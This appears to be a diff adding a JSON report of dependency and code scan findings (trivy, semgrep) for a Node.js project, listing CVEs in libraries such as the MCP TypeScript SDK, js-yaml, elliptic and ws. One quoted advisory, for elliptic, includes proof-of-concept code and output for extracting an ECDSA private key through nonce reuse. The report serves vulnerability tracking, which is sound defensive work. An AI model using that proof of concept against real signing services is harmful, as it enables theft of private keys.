@@ -1,0 +1,753 @@
+{
+  "trivy": [
+    {
+      "id": "CVE-2025-66414",
+      "identifier_type": "cve",
+      "affected_range": "1.17.3",
+      "aliases": [],
+      "details": "MCP TypeScript SDK is the official TypeScript SDK for Model Context Protocol servers and clients. Prior to 1.24.0, The Model Context Protocol (MCP) TypeScript SDK does not enable DNS rebinding protection by default for HTTP-based servers. When an HTTP-based MCP server is run on localhost without authentication with StreamableHTTPServerTransport or SSEServerTransport and has not enabled enableDnsRebindingProtection, a malicious website could exploit DNS rebinding to bypass same-origin policy restrictions and send requests to the local MCP server. This could allow an attacker to invoke tools or access resources exposed by the MCP server on behalf of the user in those limited circumstances. Note that running HTTP-based MCP servers locally without authentication is not recommended per MCP security best practices. This issue does not affect servers using stdio transport. This vulnerability is fixed in 1.24.0.",
+      "fixed_version": "1.24.0",
+      "published": "2025-12-02T19:15:52.347000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://github.com/modelcontextprotocol/typescript-sdk"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/modelcontextprotocol/typescript-sdk/commit/09623e2aa5044f9e9da62c73d820a8250b9d97ed"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/modelcontextprotocol/typescript-sdk/commit/608360047dc6899f1cf4f0226eb62fe7b11b3898"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/modelcontextprotocol/typescript-sdk/pull/1205"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-w48q-cv73-mx4w"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66414"
+        }
+      ],
+      "scores": [],
+      "severity": "HIGH",
+      "source": "trivy",
+      "summary": "Model Context Protocol (MCP) TypeScript SDK does not enable DNS rebinding protection by default",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2025-13466",
+      "identifier_type": "cve",
+      "affected_range": "2.2.0",
+      "aliases": [],
+      "details": "body-parser 2.2.0 is vulnerable to denial of service due to inefficient handling of URL-encoded bodies with very large numbers of parameters. An attacker can send payloads containing thousands of parameters within the default 100KB request size limit, causing elevated CPU and memory usage. This can lead to service slowdown or partial outages under sustained malicious traffic.\nThis issue is addressed in version 2.2.1.",
+      "fixed_version": "2.2.1",
+      "published": "2025-11-24T19:15:46.857000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2025-13466"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/expressjs/body-parser"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/expressjs/body-parser/commit/b204886a6744b0b6d297cd0e849d75de836f3b63"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/expressjs/body-parser/releases/tag/v2.2.1"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/expressjs/body-parser/security/advisories/GHSA-wqch-xfxh-vrr4"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-13466"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2025-13466"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "redhat"
+        }
+      ],
+      "severity": "MEDIUM",
+      "source": "trivy",
+      "summary": "body-parser: body-parser denial of service",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2025-64718",
+      "identifier_type": "cve",
+      "affected_range": "4.1.0",
+      "aliases": [],
+      "details": "js-yaml is a JavaScript YAML parser and dumper. In js-yaml 4.1.0 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted. The problem is patched in js-yaml 4.1.1. Users can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).",
+      "fixed_version": "4.1.1, 3.14.2",
+      "published": "2025-11-13T16:15:57.153000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2025-64718"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/nodeca/js-yaml"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2025-64718"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "redhat"
+        }
+      ],
+      "severity": "MEDIUM",
+      "source": "trivy",
+      "summary": "js-yaml: js-yaml prototype pollution in merge",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "GHSA-vjh7-7g9h-fjfh",
+      "identifier_type": "other",
+      "affected_range": "6.5.4",
+      "aliases": [],
+      "details": "### Summary\n\nPrivate key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input\n\nNote that `elliptic` by design accepts hex strings as one of the possible input types\n\n### Details\n\nIn this code: https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107\n\n`msg` is a BN instance after conversion, but `nonce` is an array, and different BN instances could generate equivalent arrays after conversion.\n\nMeaning that a same `nonce` could be generated for different messages used in signing process, leading to `k` reuse, leading to private key extraction from a pair of signatures\n\nSuch a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction\n\nWhile signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still _should not_ leak the private key\n\nAlso, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain\n\n### PoC\n\n#### `k` reuse example\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'ed25519' // or any other curve, e.g. secp256k1\nconst ec = new EC(curve)\nconst prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`\nconst sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones\nconst sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form\nconst sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`\nconsole.log({ sig0, sig1, sig2 })\n```\n\n#### Full attack\n\nThis doesn't include code for generation/recovery on a purpose (bit it's rather trivial)\n\n```js\nimport elliptic from 'elliptic'\n\nconst { ec: EC } = elliptic\n\nconst privateKey = crypto.getRandomValues(new Uint8Array(32))\nconst curve = 'secp256k1' // or any other curve, e.g. ed25519\nconst ec = new EC(curve)\n\n// Any message, e.g. previously known signature\nconst msg0 = crypto.getRandomValues(new Uint8Array(32))\nconst sig0 = ec.sign(msg0, privateKey)\n\n// Attack\nconst msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types\nconst sig1 = ec.sign(msg1, privateKey)\n\nconst something = extract(msg0, sig0, sig1, curve)\n\nconsole.log('Curve:', curve)\nconsole.log('Typeof:', typeof msg1)\nconsole.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)\nconst rnd = crypto.getRandomValues(new Uint8Array(32))\nconst st = (x) => JSON.stringify(x)\nconsole.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))\nconsole.log('Orig key:', Buffer.from(privateKey).toString('hex'))\nconsole.log('Restored:', something)\n```\n\nOutput:\n```console\nCurve: secp256k1\nTypeof: string\nKeys equal? true\nKeys equivalent? true\nOrig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\nRestored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a\n```\n\nSimilar for `ed25519`, but due to low `n`, the key might not match precisely but is nevertheless equivalent for signing:\n```console\nCurve: ed25519\nTypeof: string\nKeys equal? false\nKeys equivalent? true\nOrig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189\nRestored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6\n```\n`restored` is equal to `orig` mod `N`.\n\n### Impact\n\nFull private key extraction when signing a single malicious message (that passes `JSON.stringify`/`JSON.parse`)",
+      "fixed_version": "6.6.1",
+      "published": "2025-02-12T19:47:52Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/04cb6f54ce552b3ebde6be06d6050419e1c7333e"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh"
+        }
+      ],
+      "scores": [],
+      "severity": "CRITICAL",
+      "source": "trivy",
+      "summary": "Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string)",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2024-42459",
+      "identifier_type": "cve",
+      "affected_range": "6.5.4",
+      "aliases": [],
+      "details": "In the Elliptic package 6.5.6 for Node.js, EDDSA signature malleability occurs because there is a missing signature length check, and thus zero-valued bytes can be removed or appended.",
+      "fixed_version": "6.5.7",
+      "published": "2024-08-02T07:16:10.003000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2024-42459"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/c0690b36be043ee73c1780ae4b7df48632b11cf9"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/pull/317"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-42459"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241004-0005"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241004-0005/"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-42459"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "redhat"
+        }
+      ],
+      "severity": "LOW",
+      "source": "trivy",
+      "summary": "elliptic: nodejs/elliptic: EDDSA signature malleability due to missing signature length check",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2024-42460",
+      "identifier_type": "cve",
+      "affected_range": "6.5.4",
+      "aliases": [],
+      "details": "In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because there is a missing check for whether the leading bit of r and s is zero.",
+      "fixed_version": "6.5.7",
+      "published": "2024-08-02T07:16:10.120000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2024-42460"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/b6ff1758d9a6d1a7aec177ff6df9f586492a6315"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/pull/317"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-42460"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241004-0005"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241004-0005/"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-42460"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "redhat"
+        }
+      ],
+      "severity": "LOW",
+      "source": "trivy",
+      "summary": "elliptic: nodejs/elliptic: ECDSA signature malleability due to missing checks",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2024-42461",
+      "identifier_type": "cve",
+      "affected_range": "6.5.4",
+      "aliases": [],
+      "details": "In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because BER-encoded signatures are allowed.",
+      "fixed_version": "6.5.7",
+      "published": "2024-08-02T07:16:10.230000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2024-42461"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/pull/317"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-42461"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241004-0005"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241004-0005/"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-42461"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 9.1,
+          "version": "nvd"
+        },
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "redhat"
+        }
+      ],
+      "severity": "LOW",
+      "source": "trivy",
+      "summary": "elliptic: nodejs/elliptic: ECDSA implementation malleability due to BER-enconded signatures being allowed",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2024-48948",
+      "identifier_type": "cve",
+      "affected_range": "6.5.4",
+      "aliases": [],
+      "details": "The Elliptic package 6.5.7 for Node.js, in its for ECDSA implementation, does not correctly verify valid signatures if the hash contains at least four leading 0 bytes and when the order of the elliptic curve's base point is smaller than the hash, because of an _truncateToN anomaly. This leads to valid signatures being rejected. Legitimate transactions or communications may be incorrectly flagged as invalid.",
+      "fixed_version": "6.6.0",
+      "published": "2024-10-15T14:15:05.280000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2024-48948"
+        },
+        {
+          "type": "web",
+          "url": "https://blog.trailofbits.com/2025/11/18/we-found-cryptography-bugs-in-the-elliptic-library-using-wycheproof"
+        },
+        {
+          "type": "web",
+          "url": "https://blog.trailofbits.com/2025/11/18/we-found-cryptography-bugs-in-the-elliptic-library-using-wycheproof/"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/issues/321"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/pull/322"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48948"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241220-0004"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241220-0004/"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-48948"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 4.8,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 3.7,
+          "version": "redhat"
+        }
+      ],
+      "severity": "LOW",
+      "source": "trivy",
+      "summary": "elliptic: ECDSA signature verification error may reject legitimate transactions",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2024-48949",
+      "identifier_type": "cve",
+      "affected_range": "6.5.4",
+      "aliases": [],
+      "details": "The verify function in lib/elliptic/eddsa/index.js in the Elliptic package before 6.5.6 for Node.js omits \"sig.S().gte(sig.eddsa.curve.n) || sig.S().isNeg()\" validation.",
+      "fixed_version": "6.5.6",
+      "published": "2024-10-10T01:15:11.127000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2024-48949"
+        },
+        {
+          "type": "web",
+          "url": "https://blog.trailofbits.com/2025/11/18/we-found-cryptography-bugs-in-the-elliptic-library-using-wycheproof"
+        },
+        {
+          "type": "web",
+          "url": "https://blog.trailofbits.com/2025/11/18/we-found-cryptography-bugs-in-the-elliptic-library-using-wycheproof/"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/commit/7ac5360118f74eb02da73bdf9f24fd0c72ff5281"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/indutny/elliptic/compare/v6.5.5...v6.5.6"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48949"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241227-0003"
+        },
+        {
+          "type": "web",
+          "url": "https://security.netapp.com/advisory/ntap-20241227-0003/"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-48949"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 9.1,
+          "version": "nvd"
+        },
+        {
+          "type": "cvss",
+          "value": 8.2,
+          "version": "redhat"
+        }
+      ],
+      "severity": "LOW",
+      "source": "trivy",
+      "summary": "elliptic: Missing Validation in Elliptic's EDDSA Signature Verification",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2025-66400",
+      "identifier_type": "cve",
+      "affected_range": "13.2.0",
+      "aliases": [],
+      "details": "mdast-util-to-hast is an mdast utility to transform to hast. From 13.0.0 to before 13.2.1, multiple (unprefixed) classnames could be added in markdown source by using character references. This could make rendered user supplied markdown code elements appear like the rest of the page. This vulnerability is fixed in 13.2.1.",
+      "fixed_version": "13.2.1",
+      "published": "2025-12-01T23:15:53.070000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2025-66400"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/syntax-tree/mdast-util-to-hast"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/syntax-tree/mdast-util-to-hast/commit/6fc783ae6abdeb798fd5a68e7f3f21411dde7403"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/syntax-tree/mdast-util-to-hast/commit/ab3a79570a1afbfa7efef5d4a0cd9b5caafbc5d7"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/syntax-tree/mdast-util-to-hast/security/advisories/GHSA-4fh9-h7wg-q85m"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66400"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2025-66400"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 5.3,
+          "version": "redhat"
+        }
+      ],
+      "severity": "MEDIUM",
+      "source": "trivy",
+      "summary": "mdast-util-to-hast: mdast-util-to-hast: Markdown code elements can appear as regular page content",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    },
+    {
+      "id": "CVE-2024-37890",
+      "identifier_type": "cve",
+      "affected_range": "7.4.6",
+      "aliases": [],
+      "details": "ws is an open source WebSocket client and server for Node.js. A request with a number of headers exceeding theserver.maxHeadersCount threshold could be used to crash a ws server. The vulnerability was fixed in ws@8.17.1 (e55e510) and backported to ws@7.5.10 (22c2876), ws@6.2.3 (eeb76d3), and ws@5.2.4 (4abd8f6). In vulnerable versions of ws, the issue can be mitigated in the following ways: 1. Reduce the maximum allowed length of the request headers using the --max-http-header-size=size and/or the maxHeaderSize options so that no more headers than the server.maxHeadersCount limit can be sent. 2. Set server.maxHeadersCount to 0 so that no limit is applied.",
+      "fixed_version": "5.2.4, 6.2.3, 7.5.10, 8.17.1",
+      "published": "2024-06-17T20:15:13.203000Z",
+      "references": [
+        {
+          "type": "web",
+          "url": "https://access.redhat.com/security/cve/CVE-2024-37890"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws/issues/2230"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws/pull/2231"
+        },
+        {
+          "type": "web",
+          "url": "https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q"
+        },
+        {
+          "type": "web",
+          "url": "https://nodejs.org/api/http.html#servermaxheaderscount"
+        },
+        {
+          "type": "web",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-37890"
+        },
+        {
+          "type": "web",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2024-37890"
+        }
+      ],
+      "scores": [
+        {
+          "type": "cvss",
+          "value": 7.5,
+          "version": "ghsa"
+        },
+        {
+          "type": "cvss",
+          "value": 5.9,
+          "version": "redhat"
+        }
+      ],
+      "severity": "HIGH",
+      "source": "trivy",
+      "summary": "nodejs-ws: denial of service when handling a request with many HTTP headers",
+      "rule_name": null,
+      "rule_id": null,
+      "confidence": null,
+      "file_location": null,
+      "line_range": null,
+      "categories": []
+    }
+  ],
+  "osv-scanner": [],
+  "semgrep": [
+    {
+      "id": "dockerfile.security.missing-user.missing-user",
+      "identifier_type": "semgrep_rule",
+      "affected_range": "",
+      "aliases": [],
+      "details": "By not specifying a USER, a program in the container may run as 'root'. This is a security hazard. If an attacker can control a process running as root, they may have control over the container. Ensure that the last USER in a Dockerfile is a USER other than 'root'.",
+      "fixed_version": null,
+      "published": null,
+      "references": [
+        {
+          "type": "web",
+          "url": "https://owasp.org/Top10/A04_2021-Insecure_Design"
+        }
+      ],
+      "scores": [],
+      "severity": "HIGH",
+      "source": null,
+      "summary": "dockerfile.security.missing-user.missing-user",
+      "rule_name": "dockerfile.security.missing-user.missing-user",
+      "rule_id": "dockerfile.security.missing-user.missing-user",
+      "confidence": "MEDIUM",
+      "file_location": "Dockerfile",
+      "line_range": "37-37",
+      "categories": [
+        "CWE-250: Execution with Unnecessary Privileges"
+      ]
+    },
+    {
+      "id": "javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring",
+      "identifier_type": "semgrep_rule",
+      "affected_range": "",
+      "aliases": [],
+      "details": "Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string.",
+      "fixed_version": null,
+      "published": null,
+      "references": [
+        {
+          "type": "web",
+          "url": "https://cwe.mitre.org/data/definitions/134.html"
+        }
+      ],
+      "scores": [],
+      "severity": "LOW",
+      "source": null,
+      "summary": "javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring",
+      "rule_name": "javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring",
+      "rule_id": "javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring",
+      "confidence": "LOW",
+      "file_location": "src/logger.ts",
+      "line_range": "44-44",
+      "categories": [
+        "CWE-134: Use of Externally-Controlled Format String"
+      ]
+    }
+  ],
+  "yara": []
+}
